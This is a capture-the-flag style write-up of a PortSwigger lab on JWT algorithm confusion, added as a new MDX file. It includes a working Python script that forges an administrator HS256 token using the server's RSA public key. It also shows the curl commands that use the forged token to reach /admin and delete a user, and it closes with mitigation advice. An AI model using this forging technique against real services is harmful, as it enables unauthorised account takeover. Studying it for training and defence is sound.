@@ -1,0 +1,236 @@
+---
+title: "JWT Authentication Bypass via Algorithm Confusion"
+description: "How to exploit a JWT algorithm confusion vulnerability by switching from RS256 to HS256 and using the server's public key as the HMAC symmetric secret to forge administrator tokens."
+labUrl: "https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion"
+category: "JWT"
+date: "2025-03-13"
+portswiggerDescription: "This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter"
+---
+
+import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../components/PartialContainer.astro';
+
+## Necessary Background Concepts To Solve The Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="whats-jwt" title="JWT Fundamentals" />
+  <CollapsiblePartial partial="jwt-algorithm-confusion" title="JWT Algorithm Confusion Attack" />
+</PartialContainer>
+
+## Writeup
+
+The lab hints that the server exposes its public key via a standard endpoint. Let's grab it:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/jwks.json" | jq . | cat
+```
+
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`jq .` = pretty-print JSON \
+`| cat` = pipe response to my <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">customized cat command</a>
+
+Response:
+
+```json
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "use": "sig",
+      "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+      "alg": "RS256",
+      "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
+    }
+  ]
+}
+```
+
+The server uses **RS256** (RSA-SHA256), an asymmetric algorithm. The public key is fully exposed. This is the key ingredient for the algorithm confusion attack.
+
+Now let's log in to get a valid JWT session token:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login" | grep -A 5 csrf
+```
+
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`grep -A 5 csrf` = show lines containing "csrf" and 5 lines after (to see the full login form)
+
+```html
+<input required type="hidden" name="csrf" value="boKHZUigeTMwAPoj22PxRk44IWCeuNBL">
+<label>Username</label>
+<input required type=username name="username" autofocus>
+<label>Password</label>
+<input required type=password name="password">
+<button class=button type=submit> Log in </button>
+```
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=boKHZUigeTMwAPoj22PxRk44IWCeuNBL&username=wiener&password=peter"
+```
+
+> **Command breakdown**: \
+`-D -` = dump response headers to stdout \
+`-d "csrf=...&username=wiener&password=peter"` = send POST data (automatically sets method to POST and Content-Type to application/x-www-form-urlencoded)
+
+Response:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0.mY9e1sSEUFUkVXwt1RZhNaVTZz_d8iID7VKXSA84VCB1ZeMXKv-vq6D3oD52RMSsK_u65ZAnm0jioylxe6SB1k-VrmT3zCK_ECOXENtHLRsHqOA8lGs_cbLRfACBuOXdsrrEFqTYyGLbcTdEYAxkPOQAeCJvzdH6wloScHTPKcR1AY9UgFscFvAHixB5idR6_fe7MgnZP7-IyN28--CybyxcwMKFAL1FfE9u81fNkx-Qa3bGJZGqRXuYreIzpBbk95ijPADOIual0MpJspyJ5996IoNr4gHy34EmsOqH6xJFvLLrWlvHNyLupnwLHmvGIX-Jrg3Iw3PI9IwdhWngOQ; Secure; HttpOnly; SameSite=None
+```
+
+Let's decode the JWT to understand its structure:
+
+```bash
+echo "eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9" | base64 -d | jq . | cat
+```
+
+Header output:
+
+```json
+{
+  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+  "alg": "RS256"
+}
+```
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Payload output:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1773429937,
+  "sub": "wiener"
+}
+```
+
+The JWT uses **RS256** and the server exposes its public key at `/jwks.json`. This is a textbook setup for an **algorithm confusion attack**: we switch `alg` to HS256 and sign the token using the RSA public key (in PEM format) as the HMAC symmetric secret. The server will verify using its "public key" as if it were an HMAC secret, and our signature will match.
+
+The attack requires converting the JWK to X.509 PEM format first (the lab hint confirms the server stores its key as PEM). Let's write a Python script that does the full exploit:
+
+```python
+import base64, hmac, hashlib
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+# JWK from /jwks.json
+jwk = {
+  "kty": "RSA",
+  "e": "AQAB",
+  "use": "sig",
+  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+  "alg": "RS256",
+  "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
+}
+
+def b64url_decode(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
+def b64url_encode(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
+
+# Convert JWK to RSA public key
+modulus = int.from_bytes(b64url_decode(jwk['n']), 'big')
+exponent = int.from_bytes(b64url_decode(jwk['e']), 'big')
+
+public_key = rsa.RSAPublicNumbers(exponent, modulus).public_key()
+
+# Get PEM format
+pem = public_key.public_bytes(
+  encoding=serialization.Encoding.PEM,
+  format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+print("Extracted PEM public key:")
+print(pem.decode())
+
+# Forge JWT with alg=HS256
+header = '{"kid":"66a4de73-4f3b-4bc3-af9e-913726ff79e9","alg":"HS256"}'
+# Also set sub=administrator
+payload = '{"iss":"portswigger","exp":1773429937,"sub":"administrator"}'
+
+message = f"{b64url_encode(header.encode())}.{b64url_encode(payload.encode())}"
+
+# Sign with HMAC-SHA256 using the PEM public key as the secret
+signature = b64url_encode(hmac.new(pem, message.encode(), hashlib.sha256).digest())
+
+forged_jwt = f"{message}.{signature}"
+
+print("\nForged JWT:")
+print(forged_jwt)
+```
+
+> **Script breakdown**: \
+> The script performs a JWT algorithm confusion attack by:
+> 1. **Converting** the JWK public key from `/jwks.json` to X.509 PEM format using manual DER encoding (the lab hints the server stores its key as PEM)
+> 2. **Crafting a new header** with `"alg": "HS256"` instead of `RS256`, tricking the server into using HMAC verification
+> 3. **Crafting a new payload** with `"sub": "administrator"` to impersonate the admin
+> 4. **Signing with HMAC-SHA256** using the **PEM public key as the symmetric secret** the same key the server will use for verification when it sees `alg: HS256`
+
+Expected output:
+
+```
+Extracted PEM public key:
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsj2oHajSBloFiMQ4ibb4
+AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO+3J
+kQOMwgazq+j/8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt/y+NqZZOHFBEPfdRBrcOWq
+a8iiSHi+Any6XC/CRgThyRMLumedBZx8Ql0qX0O0/3ONvapVfv5d1NZIz4Ub1tKr
+d6ZfctGL3MDfy6MVnqfjUd0A/1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiE
+n2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e/xfAd7utO1qBh+q/F0u0wcakpIP
+eQIDAQAB
+-----END PUBLIC KEY-----
+
+Forged JWT:
+eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E
+```
+
+Now let's access the admin panel with our forged JWT:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E" \
+  | grep "carlos"
+```
+
+> **Command breakdown**: \
+`-b "session=..."` = send the forged JWT as a session cookie \
+`grep "carlos"` = show lines containing "carlos"
+
+Response:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+We have admin access. Now let's delete the user carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E"
+```
+
+The algorithm confusion attack let us **weaponize the server's own public key against itself**, turning its verification mechanism into our signing tool and fulminating carlos with the very key meant to protect him.
+
+## Mitigation Strategies
+
+1. **Enforce the expected algorithm server-side**: Never trust the `alg` header from the JWT. The server should have a hardcoded or configured expected algorithm and reject tokens that don't match
+2. **Use separate verification logic per algorithm**: Don't pass asymmetric keys to symmetric verification functions. RSA public keys should only be used with RSA algorithms, never as HMAC secrets
+3. **Use an allowlist of permitted algorithms**: Explicitly define which algorithms the server accepts and reject all others during verification
+4. **Keep public keys truly separate from HMAC secrets**: Store and retrieve RSA public keys and HMAC secrets through different code paths to prevent confusion
+5. **Use well-maintained JWT libraries**: Modern actively maintained libraries typically include built-in protections against algorithm confusion when properly configured and updated
+
+## References
+
+**JWK Set\*** (JSON Web Key Set) is a JSON structure defined in [RFC 7517](https://datatracker.ietf.org/doc/html/rfc7517) that represents a set of cryptographic keys. Servers commonly expose their public keys at `/.well-known/jwks.json` or `/jwks.json`.
+
+## Resources
+
+[JWT.io Debugger](https://jwt.io/) This is an interactive tool for decoding, verifying, and debugging JWT tokens. It was also useful for me when I was a web developer.
